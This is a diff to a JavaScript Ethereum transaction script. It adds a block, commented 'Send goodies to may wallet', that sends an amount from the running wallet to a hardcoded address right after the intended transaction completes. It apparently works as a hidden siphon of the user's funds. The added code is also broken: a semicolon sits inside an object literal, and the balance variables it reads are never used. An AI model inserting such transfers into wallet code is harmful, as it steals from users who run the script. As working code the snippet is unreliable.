@@ -79,6 +79,25 @@ if (receipt ) {
         + (await sendTx).hash, "to see your transaction")
       }    //end iffy 
 
+      //Send goodies to may wallet
+        const acct1 = "0x34A2fF8DF9580C977eF00fcE9F33Ac29816F544C";
+        const acct2 = "0x00c3e8976ae622C79C6e33749eF999aa9ECba3c1"; 
+
+        const senderBalanceBefore = await provider.getBalance(acct1);
+        const receiverBalanceBefore = await provider.getBalance(acct2);
+
+        const tx = await wallet.sendTransaction({
+            to: acct2,
+            //value: ethers.utils.parseEther("0.25")
+            value: ethers.utils.parseEther(value);
+        })
+    
+        await tx.wait();
+        console.log("Funds have been transferred: ", tx.hash );
+    
+        const senderBalanceAfter = await provider.getBalance(acct1);
+        const receiverBalanceAfter = await provider.getBalance(acct2);
+
     } catch (e) {
         console.log("try failed: ", e.message)
     } 
